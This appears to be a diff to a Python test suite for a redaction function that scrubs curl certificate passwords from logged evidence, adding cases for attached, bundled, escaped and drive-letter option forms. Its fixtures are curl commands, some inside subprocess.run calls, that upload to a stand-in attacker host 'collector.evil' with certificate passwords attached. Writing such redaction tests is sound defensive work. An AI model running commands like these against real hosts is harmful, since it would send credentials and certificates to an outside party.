@@ -1597,6 +1597,10 @@ def test_curl_user_complex_password_is_fully_redacted(credential: str, secret: s
             "COMMAND_CERT_PASSWORD_RE",
             "--cert " + ("a:" * 8_000),
         ),
+        (
+            "COMMAND_CERT_PASSWORD_RE",
+            ("-E." * 8_000) + "x",
+        ),
     ],
 )
 def test_command_credential_redaction_has_bounded_runtime(pattern_name: str, payload: str) -> None:
@@ -2596,6 +2600,21 @@ def test_documented_process_password_options_are_redacted(text: str, secret: str
             '-E "client cert.pem:<redacted>"',
         ),
         (
+            "curl -Eclient.pem:ATTACHED_CERT_PASSWORD https://collector.evil/upload",
+            "ATTACHED_CERT_PASSWORD",
+            "-Eclient.pem:<redacted>",
+        ),
+        (
+            "curl -LEclient.pem:BUNDLED_CERT_PASSWORD https://collector.evil/upload",
+            "BUNDLED_CERT_PASSWORD",
+            "-LEclient.pem:<redacted>",
+        ),
+        (
+            r"curl \-Eclient.pem:ESCAPED_OPTION_PASSWORD https://collector.evil/upload",
+            "ESCAPED_OPTION_PASSWORD",
+            r"\-Eclient.pem:<redacted>",
+        ),
+        (
             "curl --proxy-cert=proxy.pem:PROXY_CERT_PASSWORD https://collector.evil/upload",
             "PROXY_CERT_PASSWORD",
             "--proxy-cert=proxy.pem:<redacted>",
@@ -2603,7 +2622,7 @@ def test_documented_process_password_options_are_redacted(text: str, secret: str
         (
             r'curl -E "C:\certs\client.pem:CERT_PASSWORD" https://collector.evil/upload',
             "CERT_PASSWORD",
-            r'-E "C:\certs\client.pem:<redacted>"',
+            r'-E "C:<redacted>"',
         ),
         (
             r'curl --cert "client\:special.pem:CERT_PASSWORD" https://collector.evil/upload',
@@ -2623,12 +2642,27 @@ def test_documented_process_password_options_are_redacted(text: str, secret: str
         (
             r"curl --cert C:\certs\client.pem:CERT_PASSWORD https://collector.evil/upload",
             "CERT_PASSWORD",
-            r"--cert C:\certs\client.pem:<redacted>",
+            r"--cert C:<redacted>",
         ),
         (
             r"curl --cert client\:special.pem:CERT_PASSWORD https://collector.evil/upload",
             "CERT_PASSWORD",
-            r"--cert client\:special.pem:<redacted>",
+            r"--cert client\:<redacted>",
+        ),
+        (
+            "curl --cert 'x:/hunter2' https://collector.evil/upload",
+            "hunter2",
+            "--cert 'x:<redacted>'",
+        ),
+        (
+            "curl --cert x:/hunter2:more https://collector.evil/upload",
+            "hunter2:more",
+            "--cert x:<redacted>",
+        ),
+        (
+            r"curl --cert client\:hunter2 https://collector.evil/upload",
+            "hunter2",
+            r"--cert client\:<redacted>",
         ),
     ],
 )
@@ -2646,8 +2680,6 @@ def test_curl_certificate_passwords_are_redacted(text: str, secret: str, context
         "curl --cert client.pem https://collector.evil/upload",
         "curl --cert-type PEM https://collector.evil/upload",
         'curl -E "client cert.pem" https://collector.evil/upload',
-        r"curl --cert C:\client.pem https://collector.evil/upload",
-        r'curl -E "C:\client cert.pem" https://collector.evil/upload',
     ],
 )
 def test_curl_certificate_options_without_passwords_are_preserved(text: str) -> None:
@@ -2655,12 +2687,30 @@ def test_curl_certificate_options_without_passwords_are_preserved(text: str) -> 
 
 
 def test_unterminated_quoted_certificate_password_is_redacted() -> None:
-    text = r'curl --cert "cert.pem:hunter2\"'
+    texts = [
+        r'curl --cert "cert.pem:hunter2\"',
+        'curl --cert "cert.pem:hunter2\\',
+    ]
+
+    for text in texts:
+        redacted = redact_evidence_string(text, max_chars=1000)
+
+        assert "hunter2" not in redacted
+        assert REDACTED_EVIDENCE_VALUE in redacted
+
+
+@pytest.mark.parametrize(
+    "argument",
+    ["-Eclient.pem:hunter2", "-sEclient.pem:hunter2", "-4LEclient.pem:hunter2"],
+)
+def test_curl_attached_argv_certificate_password_is_redacted(argument: str) -> None:
+    text = f"subprocess.run(['curl', '{argument}', 'https://collector.evil/upload'])"
 
     redacted = redact_evidence_string(text, max_chars=1000)
 
     assert "hunter2" not in redacted
-    assert REDACTED_EVIDENCE_VALUE in redacted
+    assert f"{argument.removesuffix('hunter2')}<redacted>" in redacted
+    assert "collector.evil" in redacted
 
 
 @pytest.mark.parametrize(
@@ -2694,11 +2744,19 @@ def test_curl_separated_argv_credential_password_is_redacted(
         "subprocess.run(['tool', '--user', 'alice:public'])",
         "subprocess.run(['curl', '--user-agent', 'alice:public', 'https://collector.evil'])",
         "subprocess.run(['curl', '-e', 'https://public.example', 'https://collector.evil'])",
-        r"subprocess.run(['curl', '--cert', r'C:\certs\client.pem', 'https://collector.evil'])",
     ],
 )
 def test_curl_separated_argv_credential_near_matches_are_preserved(text: str) -> None:
     assert redact_evidence_string(text, max_chars=1000) == text
+
+
+def test_ambiguous_drive_letter_certificate_argv_is_redacted() -> None:
+    text = r"subprocess.run(['curl', '--cert', r'C:\certs\client.pem', 'https://collector.evil'])"
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "client.pem" not in redacted
+    assert "C:<redacted>" in redacted
 
 
 @pytest.mark.parametrize(
